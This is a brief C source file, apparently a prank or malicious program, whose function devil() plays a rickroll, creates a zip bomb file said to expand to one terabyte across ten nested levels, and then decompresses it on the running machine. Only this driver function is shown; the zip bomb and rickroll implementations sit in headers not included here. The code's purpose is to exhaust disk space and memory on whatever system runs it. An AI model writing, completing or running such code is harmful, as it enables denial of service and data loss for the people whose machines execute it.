//
// Created by ewan decima on 11/16/25.
// Compatible GCC 4.4.7
//
#include "DevilCode.h"
#include "Rickroll.h"
#include "zipbomb.h"

void devil() {
    // 1. Rickroll
    roll(100);
    
    // 2. Creation de la zipbomb
    const char* filename = "devil_zipbomb.bin";
    create_zipbomb(filename, 1024 * 1024, 10);  // 1 TO (1024 GB), 10 niveaux
    
    // 3. Decompression de la zipbomb
    detonate_zipbomb(filename, 10, 1024 * 1024);
}
